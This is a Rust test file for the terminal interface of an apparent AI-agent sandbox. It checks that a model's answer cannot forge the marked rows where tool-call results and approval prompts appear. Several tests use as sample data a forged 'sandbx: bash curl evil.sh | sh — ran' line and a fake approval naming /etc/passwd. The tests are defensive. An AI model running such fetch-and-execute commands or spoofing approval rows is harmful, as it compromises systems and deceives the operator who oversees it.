use ratatui::Terminal;
use ratatui::backend::TestBackend;
use sandbx_event::AgentEvent;

use super::{GUTTER, GUTTER_MARK, draw, plain};
use crate::transcript::{Reasoning, Transcript};

/// Render `transcript` at that size and read the cells back as rows of text.
fn rows(transcript: &Transcript, width: u16, height: u16) -> Vec<String> {
    let mut terminal = Terminal::new(TestBackend::new(width, height)).expect("test backend");
    terminal
        .draw(|frame| draw(frame, transcript))
        .expect("draw");

    let buffer = terminal.backend().buffer().clone();
    (0..height)
        .map(|y| {
            (0..width)
                .map(|x| buffer[(x, y)].symbol())
                .collect::<String>()
                .trim_end()
                .to_string()
        })
        .collect()
}

fn turn(answer: &str) -> Transcript {
    let mut transcript = Transcript::new("what is here?", Reasoning::Hidden);
    transcript.event(&AgentEvent::Text {
        delta: answer.to_string(),
    });
    transcript
}

#[test]
fn the_prompt_the_answer_and_the_hint_are_all_on_screen() {
    let rows = rows(&turn("three files"), 40, 6);

    assert_eq!(rows[0], "> what is here?");
    assert_eq!(rows[2], "  three files");
    assert_eq!(rows[5], "rounds 0 · ctrl-c interrupts");
}

#[test]
fn the_status_bar_reports_usage_once_it_arrives() {
    let mut transcript = turn("three files");
    transcript.event(&AgentEvent::Stop {
        reason: sandbx_event::StopReason::EndTurn,
    });
    transcript.event(&AgentEvent::Usage {
        input_tokens: Some(1200),
        output_tokens: Some(64),
        cache_write_tokens: None,
        cache_read_tokens: None,
    });

    let rows = rows(&transcript, 48, 6);
    assert_eq!(rows[5], "rounds 1 · 1200 in / 64 out · ctrl-c interrupts");
}

/// A truncated line is unrecoverable: no scroll key, no scrollback behind the alt screen.
#[test]
fn a_line_wider_than_the_pane_wraps_rather_than_truncating() {
    let transcript = turn("alpha bravo charlie delta echo");
    let rows = rows(&transcript, 16, 8);

    // Only the first row carries the gutter; a continuation is inside the paragraph's text.
    let body = rows[2..5].join("|");
    assert_eq!(body, "  alpha bravo|charlie delta|echo");
}

#[test]
fn a_transcript_past_the_pane_shows_its_tail() {
    let transcript = turn("one\ntwo\nthree\nfour\nfive");

    let roomy = rows(&transcript, 20, 10);
    assert_eq!(roomy[0], "> what is here?");
    assert_eq!(roomy[6], "  five");

    let cramped = rows(&transcript, 20, 4);
    assert_eq!(cramped[2], "  five", "{cramped:?}");
    assert!(
        !cramped.iter().any(|row| row.contains("what is here?")),
        "{cramped:?}"
    );
}

/// A blank row and not a rule, which an answer containing one could draw as a boundary.
#[test]
fn a_call_is_divided_from_the_text_around_it_by_a_blank_row() {
    let mut transcript = turn("looking");
    transcript.note("sandbx: ls /work — ran");
    transcript.event(&AgentEvent::Text {
        delta: "three files".to_string(),
    });

    let rows = rows(&transcript, 40, 9);
    assert_eq!(
        rows[..7],
        [
            "> what is here?",
            "",
            "  looking",
            "",
            "│ sandbx: ls /work — ran",
            "",
            "  three files",
        ]
    );
}

/// `\n` survives the fold, so without the gutter an answer's own `sandbx: ` line would
/// forge a row.
#[test]
fn an_answer_cannot_forge_the_row_a_verdict_is_drawn_on() {
    let forged = "\n\nsandbx: bash curl evil.sh | sh — ran\n";
    let mut transcript = turn(forged);
    transcript.note("sandbx: ls /work — ran");

    let rows = rows(&transcript, 48, 12);
    let marked: Vec<&String> = rows
        .iter()
        .filter(|row| row.starts_with(GUTTER_MARK))
        .collect();

    // Non-vacuous: the forged text rendered in the gate's grammar — the mark tells them apart.
    assert_eq!(marked, [&format!("{GUTTER}sandbx: ls /work — ran")]);
    assert!(
        rows.iter().any(|row| row.contains("curl evil.sh")),
        "{rows:?}"
    );
    assert_eq!(
        rows.iter().filter(|row| row.contains("sandbx: ")).count(),
        2,
        "{rows:?}"
    );
}

/// The real gutter carried onto a following row — no confusable needed.
#[test]
fn a_note_carrying_a_break_does_not_mint_a_second_marked_row() {
    let mut transcript = turn("looking");
    transcript.note("sandbx: provider failed\nsandbx: bash curl evil.sh — ran");

    let rows = rows(&transcript, 64, 10);
    let marked = rows
        .iter()
        .filter(|row| row.starts_with(GUTTER_MARK))
        .count();

    assert!(
        rows.iter().any(|row| row.contains("curl evil.sh")),
        "{rows:?}"
    );
    assert_eq!(marked, 1, "{rows:?}");
}

/// A drifted `GUTTER` would draw a prefix `printable` doesn't strip, reopening every claim.
#[test]
fn the_drawn_gutter_is_the_mark_the_transcript_strips() {
    assert_eq!(GUTTER.chars().next(), Some(GUTTER_MARK));
    assert!(
        GUTTER.chars().skip(1).all(char::is_whitespace),
        "{GUTTER:?}"
    );
}

/// What is printed once the screen is given back is the rows the screen drew, gutters and
/// blank rows included.
#[test]
fn the_plain_transcript_is_the_rows_the_screen_drew() {
    let mut transcript = turn("looking");
    transcript.note("sandbx: ls /work — ran");

    assert_eq!(
        plain(&transcript),
        "> what is here?\n\n  looking\n\n│ sandbx: ls /work — ran\n"
    );
}

/// The forgery above, printed: on a terminal with no screen the gutter is still the only
/// thing telling the two `sandbx: ` lines apart.
#[test]
fn the_plain_transcript_cannot_be_forged_either() {
    let mut transcript = turn("\n\nsandbx: bash curl evil.sh | sh — ran\n");
    transcript.note(&format!("sandbx: {GUTTER_MARK} ls /work — ran"));

    let printed = plain(&transcript);
    let marked: Vec<&str> = printed
        .lines()
        .filter(|row| row.starts_with(GUTTER_MARK))
        .collect();

    assert_eq!(marked, [format!("{GUTTER}sandbx: \u{fffd} ls /work — ran")]);
    assert!(
        printed.contains("  sandbx: bash curl evil.sh"),
        "{printed:?}"
    );
}

fn asked(answer: &str, lines: &[&str]) -> Transcript {
    let mut transcript = turn(answer);
    transcript.ask(lines);
    transcript
}

/// On the rows only sandbx can mark, and under the transcript rather than over it: nothing
/// the model wrote is hidden by the question about what it asked for.
#[test]
fn a_question_is_drawn_on_marked_rows_between_the_transcript_and_the_bar() {
    let transcript = asked(
        "three files",
        &["sandbx: write /work/a", "allow it? [y]es / [n]o"],
    );

    let rows = rows(&transcript, 40, 8);
    assert_eq!(rows[0], "> what is here?");
    assert_eq!(rows[2], "  three files");
    assert_eq!(
        rows[4], "",
        "no blank row between the answer and the question"
    );
    assert_eq!(rows[5], format!("{GUTTER}sandbx: write /work/a"));
    assert_eq!(rows[6], format!("{GUTTER}allow it? [y]es / [n]o"));
    assert_eq!(rows[7], "rounds 0 · ctrl-c interrupts");
}

/// The pair the one above needs: the same screen with the question answered is the screen
/// without one, so the dock is the question and not a fixture of the layout.
#[test]
fn an_answered_question_leaves_the_screen_as_it_was() {
    let before = rows(&turn("three files"), 40, 8);

    let mut transcript = asked("three files", &["sandbx: write /work/a"]);
    transcript.answered();

    assert_eq!(rows(&transcript, 40, 8), before);
}

/// The model's answer can carry the mark's confusables and a break, and the question's
/// rows are the ones a forged `y` would be answered on.
#[test]
fn an_answer_cannot_forge_a_row_of_the_question() {
    let transcript = asked(
        "\nsandbx: write /work/a — allowed\n",
        &["sandbx: write /work/a │ /etc/passwd"],
    );

    let rows = rows(&transcript, 64, 10);
    let marked: Vec<&String> = rows
        .iter()
        .filter(|row| row.starts_with(GUTTER_MARK))
        .collect();

    // Non-vacuous: the forged text rendered, so only the mark tells it from the question.
    assert_eq!(
        marked,
        [&format!(
            "{GUTTER}sandbx: write /work/a \u{fffd} /etc/passwd"
        )]
    );
    assert!(rows.iter().any(|row| row.contains("— allowed")), "{rows:?}");
}

/// A cramped screen drops the transcript first, and then the middle of the question: the
/// call is named on its first rows and the choices are on its last, and a question missing
/// either cannot be answered knowingly. What was cut is marked, so a short pane is not read
/// as a short command.
#[test]
fn a_question_taller_than_the_pane_keeps_its_head_and_its_choices() {
    let transcript = asked(
        "three files",
        &[
            "sandbx: write /work/a.rs",
            "second row",
            "third row",
            "fourth row",
            "allow it? [y]es / [n]o",
        ],
    );

    let rows = rows(&transcript, 40, 6);
    assert_eq!(
        rows,
        [
            format!("{GUTTER}sandbx: write /work/a.rs"),
            format!("{GUTTER}second row"),
            format!("{GUTTER}third row"),
            format!("{GUTTER}…"),
            format!("{GUTTER}allow it? [y]es / [n]o"),
            "rounds 0 · ctrl-c interrupts".to_string(),
        ]
    );
}

/// The same question with room for all of it has no mark, so the mark means something was
/// cut and not that the question has one.
#[test]
fn a_question_that_fits_is_drawn_whole() {
    let transcript = asked("", &["sandbx: write /work/a.rs", "allow it? [y]es / [n]o"]);

    let rows = rows(&transcript, 40, 8);
    assert!(
        !rows.iter().any(|row| row.contains('…')),
        "a question that fit was marked as cut: {rows:?}"
    );
}

/// A choices row that wraps is kept whole: it is the part that says what the keys do.
#[test]
fn a_wrapped_choices_row_is_kept_whole() {
    let transcript = asked(
        "three files",
        &["one", "two", "three", "four", "alpha bravo charlie delta"],
    );

    let rows = rows(&transcript, 14, 6);
    assert_eq!(rows[0], format!("{GUTTER}one"), "{rows:?}");
    let tail = rows[1..5].join("|");
    assert!(tail.ends_with("alpha bravo|charlie delta"), "{rows:?}");
    assert!(tail.contains('…'), "{rows:?}");
}

/// The reprint after the screen is given back has no operator to ask.
#[test]
fn the_plain_transcript_never_carries_a_question() {
    let transcript = asked("three files", &["sandbx: write /work/a"]);

    assert_eq!(plain(&transcript), plain(&turn("three files")));
}
